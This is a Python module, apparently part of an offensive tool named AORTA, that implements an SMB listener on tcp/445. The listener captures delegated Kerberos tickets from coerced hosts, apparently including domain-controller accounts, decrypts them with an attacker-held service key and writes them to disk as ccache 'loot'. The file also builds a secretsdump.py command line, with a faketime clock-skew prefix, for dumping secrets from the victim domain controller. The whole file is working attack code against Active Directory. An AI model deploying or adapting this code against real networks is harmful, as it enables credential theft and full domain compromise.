"""Self-contained Kerberos-capturing SMB listener (tcp/445).

Replaces the former embedded-krbrelayx import.  The SMB/SPNEGO flow is
reimplemented after krbrelayx (MIT, Dirk-jan Mollema / Fox-IT -
https://github.com/dirkjanm/krbrelayx), stripped to what the AORTA capture
needs:

  * an impacket ``SMBSERVER`` (stock dependency) with SMB2 support,
  * a negotiate hook that offers Kerberos via SPNEGO negTokenInit2,
  * a session-setup hook that accepts a GSS-wrapped AP-REQ, decrypts the
    service ticket with *our* service key, pulls the delegated KRB_CRED out
    of the RFC 4121 authenticator checksum, and writes it as a ccache.

No relaying, no NTLM, no HTTP/DNS listeners, no external checkout.  Upstream
differences (deliberate): authentication failures (e.g. Windows reusing a
cached ticket minted under a previous service key) are answered with a
SPNEGO reject + STATUS_LOGON_FAILURE so the client retries and fetches a
fresh ticket through us.
"""

from __future__ import annotations

import calendar
import configparser
import datetime as dt
import logging
import re
import secrets
import shlex
import struct
import threading
import time
from collections.abc import Callable

from impacket import smb, smb3
from impacket.krb5 import types
from impacket.krb5.asn1 import (
    AP_REQ,
    KRB_CRED,
    Authenticator,
    EncKrbCredPart,
    EncTicketPart,
    _sequence_component,
    _sequence_optional_component,
)
from impacket.krb5.ccache import (
    CCache,
    CountedOctetString,
    Credential,
    Header,
    Times,
)
from impacket.krb5.ccache import Principal as CCachePrincipal
from impacket.krb5.ccache import (
    Ticket as CCacheTicket,
)
from impacket.krb5.crypto import InvalidChecksum, Key, _enctype_table
from impacket.krb5.gssapi import GSS_C_DELEG_FLAG
from impacket.nt_errors import (
    STATUS_LOGON_FAILURE,
    STATUS_MORE_PROCESSING_REQUIRED,
    STATUS_SUCCESS,
)
from impacket.smbserver import SMBSERVER, getFileTime
from pyasn1.codec.der import decoder, encoder
from pyasn1.type import char, namedtype, namedval, tag, univ

try:
    from impacket.krb5.ccache import KeyBlockV4 as _KeyBlock
except ImportError:
    from impacket.krb5.ccache import KeyBlock as _KeyBlock

log = logging.getLogger("smb")

# SPNEGO mechanism OIDs (dotted strings; impacket's TypesMech values are
# BER-encoded bytes on modern versions, so keep our own map like krbrelayx)
MECH_NTLMSSP = "1.3.6.1.4.1.311.2.2.10"
MECH_MS_KRB5 = "1.2.840.48018.1.2.2"
MECH_KRB5 = "1.2.840.113554.1.2.2"
MECH_KRB5_USER2USER = "1.2.840.113554.1.2.2.3"

# Kerberos default clockskew is 300s; below this faketime is unnecessary.
SKEW_TOLERANCE = 240

_HOUR = 3600
# victim DCs are usually skewed by whole hours (NTP-less timezone offsets);
# snap when within Kerberos tolerance of one so the hint reads '+8h' instead
# of '+28795s'. 0h is included: an in-tolerance skew is an aligned clock and
# the faketime prefix is then omitted entirely.


def snap_skew(skew: int) -> int:
    """Round a skew to the nearest whole hour when close enough (incl. 0)."""
    hours = round(skew / _HOUR)
    if abs(skew - hours * _HOUR) <= SKEW_TOLERANCE:
        return hours * _HOUR
    return skew


def format_skew(skew: int) -> str:
    """faketime-friendly rendering: whole hours as '+8h', else '+28795s'."""
    if skew == 0:
        return "0s"
    if skew % _HOUR == 0:
        return f"{skew // _HOUR:+d}h"
    return f"{skew:+d}s"


AES256 = 18  # EncryptionTypes.aes256_cts_hmac_sha1_96


# ---------------------------------------------------------------------------
# SPNEGO / GSS ASN.1 - after krbrelayx lib/utils/spnego.py (MIT)
# ---------------------------------------------------------------------------


class NegResult(univ.Enumerated):
    namedValues = namedval.NamedValues(
        ("accept_completed", 0),
        ("accept_incomplete", 1),
        ("reject", 2),
        ("request_mic", 3),
    )


class MechType(univ.ObjectIdentifier):
    pass


class MechTypeList(univ.SequenceOf):
    componentType = MechType()


class NegHints(univ.Sequence):
    componentType = namedtype.NamedTypes(
        _sequence_optional_component("hintName", 0, char.GeneralString()),
        _sequence_optional_component("hintAddress", 1, univ.OctetString()),
    )


class NegTokenInit2(univ.Sequence):
    # Microsoft server-initiated extension, [MS-SPNG]
    componentType = namedtype.NamedTypes(
        _sequence_component("mechTypes", 0, MechTypeList()),
        _sequence_optional_component("reqFlags", 1, univ.OctetString()),
        _sequence_optional_component("mechToken", 2, univ.OctetString()),
        _sequence_optional_component("negHints", 3, NegHints()),
        _sequence_optional_component("mechListMIC", 4, univ.OctetString()),
    )


class NegTokenInit(univ.Sequence):
    componentType = namedtype.NamedTypes(
        _sequence_component("mechTypes", 0, MechTypeList()),
        _sequence_optional_component("reqFlags", 1, univ.OctetString()),
        _sequence_optional_component("mechToken", 2, univ.OctetString()),
        _sequence_optional_component("mechListMIC", 3, univ.OctetString()),
    )


class NegTokenResp(univ.Sequence):
    componentType = namedtype.NamedTypes(
        _sequence_optional_component("negResult", 0, NegResult()),
        _sequence_optional_component("supportedMech", 1, MechType()),
        _sequence_optional_component("responseToken", 2, univ.OctetString()),
        _sequence_optional_component("mechListMIC", 3, univ.OctetString()),
    )


class NegotiationToken(univ.Choice):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType(
            "negTokenInit",
            NegTokenInit().subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0)),
        ),
        namedtype.NamedType(
            "negTokenResp",
            NegTokenResp().subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 1)),
        ),
    )


class GSSAPIHeader_SPNEGO_Init(univ.Sequence):
    tagSet = univ.Sequence.tagSet.tagImplicitly(tag.Tag(tag.tagClassApplication, tag.tagFormatConstructed, 0))
    componentType = namedtype.NamedTypes(
        namedtype.NamedType("tokenOid", univ.ObjectIdentifier()),
        namedtype.NamedType("innerContextToken", NegotiationToken()),
    )


class GSSAPIHeader_SPNEGO_Init2(univ.Sequence):
    tagSet = univ.Sequence.tagSet.tagImplicitly(tag.Tag(tag.tagClassApplication, tag.tagFormatConstructed, 0))
    componentType = namedtype.NamedTypes(
        namedtype.NamedType("tokenOid", univ.ObjectIdentifier()),
        _sequence_component("innerContextToken", 0, NegTokenInit2()),
    )


class GSSAPIHeader_KRB5_AP_REQ(univ.Sequence):
    tagSet = univ.Sequence.tagSet.tagImplicitly(tag.Tag(tag.tagClassApplication, tag.tagFormatConstructed, 0))
    componentType = namedtype.NamedTypes(
        namedtype.NamedType("tokenOid", univ.ObjectIdentifier()),
        # Actually this is a constant 0x0001, but this decodes as an asn1 boolean
        namedtype.NamedType("krb5_ap_req", univ.Boolean()),
        namedtype.NamedType("apReq", AP_REQ()),
    )


# ---------------------------------------------------------------------------
# Delegated-ticket extraction - after krbrelayx lib/utils/kerberos.py (MIT)
# ---------------------------------------------------------------------------


class LootError(Exception):
    """The AP-REQ could not be turned into a delegated ticket."""


def capture_delegated_ticket(mech_token: bytes, service_key: bytes) -> tuple[str, str, str, int | None]:
    """Decrypt a GSS-wrapped AP-REQ and return (ccache_filename, user, realm,
    clock_skew).

    clock_skew is the victim clock minus the local clock in whole seconds,
    taken from the authenticator ctime (the coerced host signs it with its
    own clock) - used only for the faketime hint in the secretsdump command.

    Raises LootError with a human explanation on any failure.
    """
    try:
        payload = decoder.decode(mech_token, asn1Spec=GSSAPIHeader_KRB5_AP_REQ())[0]
    except Exception as exc:
        raise LootError(f"no Kerberos AP-REQ in the mechToken: {exc}") from exc
    ap_req = payload["apReq"]

    etype = int(ap_req["ticket"]["enc-part"]["etype"])
    if etype != AES256:
        raise LootError(f"ticket uses etype {etype}, but only AES256 (18) is ever minted here")
    cipher = _enctype_table[etype]
    key = Key(etype, service_key)

    try:
        plain = cipher.decrypt(key, 2, bytes(ap_req["ticket"]["enc-part"]["cipher"]))
    except InvalidChecksum:
        raise LootError(
            "service-ticket integrity check failed - most likely a cached ticket "
            "minted under a previous service key (the retry will fetch a fresh one)"
        ) from None

    enc_ticket_part = decoder.decode(plain, asn1Spec=EncTicketPart())[0]
    session_key = Key(
        int(enc_ticket_part["key"]["keytype"]),
        bytes(enc_ticket_part["key"]["keyvalue"]),
    )

    authn_cipher = _enctype_table[int(ap_req["authenticator"]["etype"])]
    authn_plain = authn_cipher.decrypt(session_key, 11, bytes(ap_req["authenticator"]["cipher"]))
    authenticator = decoder.decode(authn_plain, asn1Spec=Authenticator())[0]

    # victim clock skew for the secretsdump faketime hint (display only)
    clock_skew: int | None = None
    try:
        _ct = dt.datetime.strptime(str(authenticator["ctime"]), "%Y%m%d%H%M%SZ").replace(tzinfo=dt.UTC)
        _cusec = int(authenticator["cusec"]) if authenticator["cusec"].isValue else 0
        clock_skew = snap_skew(int(round(_ct.timestamp() + _cusec / 1e6 - time.time())))
    except (ValueError, TypeError):
        pass

    cksum = authenticator["cksum"]
    if not cksum.isValue:
        raise LootError("authenticator has no GSSAPI checksum")
    if int(cksum["cksumtype"]) != 32771:  # GSSAPI checksum, RFC 4121 4.1.1
        raise LootError(f"checksum is not KRB5 type: {int(cksum['cksumtype'])}")

    checksum = bytes(cksum["checksum"])
    if len(checksum) < 28:
        raise LootError("truncated GSSAPI authenticator checksum")
    flags = struct.unpack("<L", checksum[20:24])[0]
    if not flags & GSS_C_DELEG_FLAG:
        raise LootError(
            "no delegated credentials in the AP-REQ (GSS_C_DELEG_FLAG unset) - "
            "the connecting account needs unconstrained delegation"
        )
    if struct.unpack("<H", checksum[24:26])[0] != 1:
        raise LootError("unsupported GSSAPI delegation option")

    dlen = struct.unpack("<H", checksum[26:28])[0]
    if dlen == 0 or dlen > len(checksum) - 28:
        raise LootError("invalid delegated-credential length in GSSAPI checksum")
    creds = decoder.decode(checksum[28 : 28 + dlen], asn1Spec=KRB_CRED())[0]
    if not creds["tickets"].isValue:
        raise LootError("delegated KRB-CRED contains no ticket")

    enc_part_plain = _enctype_table[int(creds["enc-part"]["etype"])].decrypt(
        session_key, 14, bytes(creds["enc-part"]["cipher"])
    )
    enc_part = decoder.decode(enc_part_plain, asn1Spec=EncKrbCredPart())[0]

    # Delegation carries exactly one credential (the delegated TGT)
    if not enc_part["ticket-info"].isValue:
        raise LootError("delegated KRB-CRED contains no ticket info")
    tinfo = enc_part["ticket-info"][0]
    username = "/".join(str(i) for i in tinfo["pname"]["name-string"])
    realm = str(tinfo["prealm"])
    sname = types.Principal([str(i) for i in tinfo["sname"]["name-string"]], type=int(tinfo["sname"]["name-type"]))
    log.info("Got ticket for %s@%s [%s]", username, realm, sname)

    # Principal strings are remote-controlled. Keep loot in the current
    # directory even if an unusual multi-component principal contains slashes.
    filename = _safe_filename(f"{username}@{realm}_{sname}")
    ccache = _krbcred_to_ccache(creds["tickets"][0], tinfo)
    ccache.saveFile(f"{filename}.ccache")
    return f"{filename}.ccache", username, realm.upper(), clock_skew


def _safe_filename(name: str) -> str:
    safe = re.sub(r"[^A-Za-z0-9$@._-]+", "_", name)
    safe = re.sub(r"\.{2,}", "_", safe)
    safe = re.sub(r"_+", "_", safe).strip(".")
    return safe or "delegated-ticket"


def _krbcred_to_ccache(ticket, ticketdata) -> CCache:
    """KRB_CRED ticket + ticket-info -> impacket CCache.

    After krbrelayx lib/utils/krbcredccache.py (MIT).
    """
    ccache = CCache()
    ccache.headers = []
    header = Header()
    header["tag"] = 1
    header["taglen"] = 8
    header["tagdata"] = b"\xff\xff\xff\xff\x00\x00\x00\x00"
    ccache.headers.append(header)

    client = types.Principal()
    client.from_asn1(ticketdata, "prealm", "pname")
    ccache.principal = CCachePrincipal()
    ccache.principal.fromPrincipal(client)

    server = types.Principal()
    server.from_asn1(ticketdata, "srealm", "sname")

    credential = Credential()
    credential["client"] = ccache.principal
    tmp_server = CCachePrincipal()
    tmp_server.fromPrincipal(server)
    credential["server"] = tmp_server
    credential["is_skey"] = 0
    credential["key"] = _KeyBlock()
    credential["key"]["keytype"] = int(ticketdata["key"]["keytype"])
    credential["key"]["keyvalue"] = bytes(ticketdata["key"]["keyvalue"])
    credential["key"]["keylen"] = len(credential["key"]["keyvalue"])

    credential["time"] = Times()
    # starttime / renew-till are optional in KRB-CRED ticket-info; a delegated
    # DC$ TGT always carries both, but stay safe for other principals
    start = ticketdata["starttime"] if ticketdata["starttime"].isValue else ticketdata["endtime"]
    credential["time"]["authtime"] = ccache.toTimeStamp(types.KerberosTime.from_asn1(start))
    credential["time"]["starttime"] = credential["time"]["authtime"]
    credential["time"]["endtime"] = ccache.toTimeStamp(types.KerberosTime.from_asn1(ticketdata["endtime"]))
    credential["time"]["renew_till"] = (
        ccache.toTimeStamp(types.KerberosTime.from_asn1(ticketdata["renew-till"]))
        if ticketdata["renew-till"].isValue
        else 0
    )
    credential["tktflags"] = ccache.reverseFlags(ticketdata["flags"])
    credential["num_address"] = 0

    credential.ticket = CountedOctetString()
    credential.ticket["data"] = encoder.encode(ticket.clone(tagSet=CCacheTicket.tagSet, cloneValueFlag=True))
    credential.ticket["length"] = len(credential.ticket["data"])
    credential.secondTicket = CountedOctetString()
    credential.secondTicket["data"] = b""
    credential.secondTicket["length"] = 0
    ccache.credentials.append(credential)
    return ccache


# ---------------------------------------------------------------------------
# The SMB server itself - after krbrelayx lib/servers/smbrelayserver.py (MIT)
# ---------------------------------------------------------------------------


class SmbCaptureServer(threading.Thread):
    """tcp/445 listener that captures the first delegated TGT and stops.

    ``on_ticket(ccache_path, username, domain, clock_skew)`` runs on the SMB
    server thread after the ticket was written to disk.
    """

    def __init__(
        self,
        bind_ip: str,
        service_key: bytes,
        on_ticket: Callable[[str, str, str, int | None], None],
    ):
        super().__init__(daemon=True)
        self.bind_ip = bind_ip
        self.service_key = service_key
        self.on_ticket = on_ticket
        self.server: SMBSERVER | None = None
        self._lock = threading.Lock()
        self._fired = False

    # -- lifecycle -----------------------------------------------------------

    def start(self) -> None:
        smb_config = configparser.ConfigParser()
        smb_config.add_section("global")
        smb_config.set("global", "server_name", "server_name")
        smb_config.set("global", "server_os", "UNIX")
        smb_config.set("global", "server_domain", "WORKGROUP")
        smb_config.set("global", "log_file", "None")
        smb_config.set("global", "credentials_file", "")
        smb_config.set("global", "SMB2Support", "True")
        smb_config.add_section("IPC$")
        smb_config.set("IPC$", "comment", "")
        smb_config.set("IPC$", "read only", "yes")
        smb_config.set("IPC$", "share type", "3")
        smb_config.set("IPC$", "path", "")

        self.server = SMBSERVER((self.bind_ip, 445), config_parser=smb_config)
        logging.getLogger("impacket.smbserver").setLevel(logging.CRITICAL)
        self.server.processConfigFile()
        self.server.hookSmb2Command(smb3.SMB2_NEGOTIATE, self._negotiate)
        self.server.hookSmb2Command(smb3.SMB2_SESSION_SETUP, self._session_setup)
        super().start()

    def stop(self) -> None:
        srv, self.server = self.server, None
        if srv is None:
            return
        try:
            srv.shutdown()  # unblocks serve_forever; thread then closes
            self.join(timeout=5)
        except Exception as exc:  # already dead - fine
            log.debug("smb capture stop: %s", exc)

    def run(self) -> None:
        server = self.server  # local ref: stop() may null self.server mid-shutdown
        if server is None:
            return
        log.info("Setting up SMB Server")
        server.daemon_threads = True
        server.serve_forever()
        log.info("Shutting down SMB Server")
        server.server_close()

    # -- SMB2 hooks ------------------------------------------------------------

    def _negotiate(self, connId, smbServer, recvPacket, isSMB1=False):
        connData = smbServer.getConnectionData(connId, checkStatus=False)
        log.info("SMBD: Received connection from %s", connData["ClientIP"])

        respPacket = smb3.SMB2Packet()
        respPacket["Flags"] = smb3.SMB2_FLAGS_SERVER_TO_REDIR
        respPacket["Status"] = STATUS_SUCCESS
        respPacket["CreditRequestResponse"] = 1
        respPacket["Command"] = smb3.SMB2_NEGOTIATE
        respPacket["SessionID"] = 0
        respPacket["MessageID"] = 0 if isSMB1 else recvPacket["MessageID"]
        respPacket["TreeID"] = 0

        respSMBCommand = smb3.SMB2Negotiate_Response()
        respSMBCommand["SecurityMode"] = smb3.SMB2_NEGOTIATE_SIGNING_ENABLED

        if isSMB1 is True:
            # Parse the SMB1 negotiate to see if the client supports SMB2
            smb_command = smb.SMBCommand(recvPacket["Data"][0])
            dialects = smb_command["Data"].split(b"\x02")
            if b"SMB 2.002\x00" in dialects or b"SMB 2.???\x00" in dialects:
                respSMBCommand["DialectRevision"] = smb3.SMB2_DIALECT_002
            else:
                raise Exception("Client does not support SMB2, fallbacking")
        else:
            respSMBCommand["DialectRevision"] = smb3.SMB2_DIALECT_002

        respSMBCommand["ServerGuid"] = secrets.token_bytes(16)
        respSMBCommand["Capabilities"] = 0
        respSMBCommand["MaxTransactSize"] = 65536
        respSMBCommand["MaxReadSize"] = 65536
        respSMBCommand["MaxWriteSize"] = 65536
        respSMBCommand["SystemTime"] = getFileTime(calendar.timegm(time.gmtime()))
        respSMBCommand["ServerStartTime"] = getFileTime(calendar.timegm(time.gmtime()))
        respSMBCommand["SecurityBufferOffset"] = 0x80

        # Offer Kerberos first via server-initiated SPNEGO (negTokenInit2)
        blob = GSSAPIHeader_SPNEGO_Init2()
        blob["tokenOid"] = "1.3.6.1.5.5.2"
        blob["innerContextToken"]["mechTypes"].extend(
            [
                MechType(MECH_KRB5),
                MechType(MECH_MS_KRB5),
                MechType(MECH_NTLMSSP),
            ]
        )
        blob["innerContextToken"]["negHints"]["hintName"] = "not_defined_in_RFC4178@please_ignore"
        respSMBCommand["Buffer"] = encoder.encode(blob)
        respSMBCommand["SecurityBufferLength"] = len(respSMBCommand["Buffer"])

        respPacket["Data"] = respSMBCommand
        smbServer.setConnectionData(connId, connData)
        return None, [respPacket], STATUS_SUCCESS

    def _session_setup(self, connId, smbServer, recvPacket):
        connData = smbServer.getConnectionData(connId, checkStatus=False)

        respSMBCommand = smb3.SMB2SessionSetup_Response()
        sessionSetupData = smb3.SMB2SessionSetup(recvPacket["Data"])
        connData["Capabilities"] = sessionSetupData["Capabilities"]
        securityBlob = sessionSetupData["Buffer"]

        if securityBlob[0:1] != b"\x60":  # not an ASN.1 [APPLICATION 0] GSS header
            smbServer.log("No negTokenInit sent by client", logging.CRITICAL)
            respSMBCommand["SecurityBufferOffset"] = 0x48
            respSMBCommand["SecurityBufferLength"] = 0
            respSMBCommand["Buffer"] = b""
            return [respSMBCommand], None, STATUS_LOGON_FAILURE

        try:
            blob = decoder.decode(securityBlob, asn1Spec=GSSAPIHeader_SPNEGO_Init())[0]
            mech_types = blob["innerContextToken"]["negTokenInit"]["mechTypes"]
            mech_token = blob["innerContextToken"]["negTokenInit"]["mechToken"]
        except Exception as exc:
            raise Exception(f"could not parse SPNEGO negTokenInit: {exc}") from exc

        if len(mech_types) > 0 and str(mech_types[0]) not in (
            MECH_KRB5,
            MECH_MS_KRB5,
            MECH_KRB5_USER2USER,
        ):
            # Not Kerberos - tell the client we only support it
            smbServer.log(f"Unsupported MechType '{mech_types[0]}'", logging.CRITICAL)
            respToken = NegotiationToken()
            respToken["negTokenResp"]["negResult"] = "request_mic"
            respToken["negTokenResp"]["supportedMech"] = MECH_KRB5
            respTokenData = encoder.encode(respToken)
            respSMBCommand["SecurityBufferOffset"] = 0x48
            respSMBCommand["SecurityBufferLength"] = len(respTokenData)
            respSMBCommand["Buffer"] = respTokenData
            smbServer.setConnectionData(connId, connData)
            return [respSMBCommand], None, STATUS_MORE_PROCESSING_REQUIRED

        # Kerberos AP-REQ: extract the delegated ticket
        try:
            path, username, domain, clock_skew = capture_delegated_ticket(
                mech_token.asOctets() if mech_token.isValue else b"",
                self.service_key,
            )
        except Exception as exc:
            log.warning("ticket capture failed: %s", exc)
            respToken = NegotiationToken()
            respToken["negTokenResp"]["negResult"] = "reject"
            respTokenData = encoder.encode(respToken)
            respSMBCommand["SecurityBufferOffset"] = 0x48
            respSMBCommand["SecurityBufferLength"] = len(respTokenData)
            respSMBCommand["Buffer"] = respTokenData
            smbServer.setConnectionData(connId, connData)
            return [respSMBCommand], None, STATUS_LOGON_FAILURE

        log.info("Saving ticket in %s", path)
        smbServer.setConnectionData(connId, connData)
        self._ticket_saved(path, username, domain, clock_skew)

        respToken = NegotiationToken()
        respToken["negTokenResp"]["negResult"] = "accept_completed"
        respTokenData = encoder.encode(respToken)
        respSMBCommand["SecurityBufferOffset"] = 0x48
        respSMBCommand["SecurityBufferLength"] = len(respTokenData)
        respSMBCommand["Buffer"] = respTokenData
        return [respSMBCommand], None, STATUS_SUCCESS

    # -- internals -----------------------------------------------------------

    def _ticket_saved(self, path: str, username: str, domain: str, clock_skew: int | None) -> None:
        with self._lock:
            if self._fired:  # first ticket only, by design
                return
            self._fired = True
        log.info("delegated ticket saved: %s", path)
        try:
            self.on_ticket(path, username, domain, clock_skew)
        except Exception:
            log.exception("on_ticket callback failed")


# ---------------------------------------------------------------------------
# Post-capture hints
# ---------------------------------------------------------------------------


def secretsdump_command(
    ccache: str,
    victim_realm: str,
    victim_dc: str | None = None,
    skew_seconds: int | None = None,
) -> str:
    """Build the post-capture secretsdump command line (NOT executed here)."""
    target = (victim_dc or f"dc.{victim_realm.lower()}").lower()
    env = f"KRB5CCNAME={shlex.quote(ccache)}"
    faketime = ""
    if skew_seconds is not None and abs(skew_seconds) >= SKEW_TOLERANCE:
        faketime = f" faketime -f '{format_skew(skew_seconds)}'"
    return f"{env}{faketime} secretsdump.py -k -no-pass {shlex.quote(target)}"
